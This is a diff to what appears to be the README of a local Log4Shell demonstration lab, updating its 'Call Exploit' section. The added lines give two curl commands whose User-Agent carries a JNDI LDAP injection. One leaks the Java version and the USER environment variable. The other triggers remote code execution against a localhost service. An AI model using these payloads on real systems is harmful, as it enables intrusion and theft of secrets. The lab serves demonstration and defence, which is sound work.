@@ -46,7 +46,8 @@ _Note: With Java 11 or Java8u191+ (for other Java SDKs see [here](https://www.ge
 
 ### Call Exploit
 
-* Call `curl -A '${jndi:ldap://localhost:1389/a}' http://localhost:9090/`
+* _Secret Information Exposure_: Call `curl -A '${jndi:ldap://localhost:1389/javaversion:${java:version}/user:${env:USER}}' http://localhost:9090/`
+* _Remote Code Execution (Command & Control)_: Call `curl -A '${jndi:ldap://localhost:1389/exec}' http://localhost:9090/`
 
 ### References
 
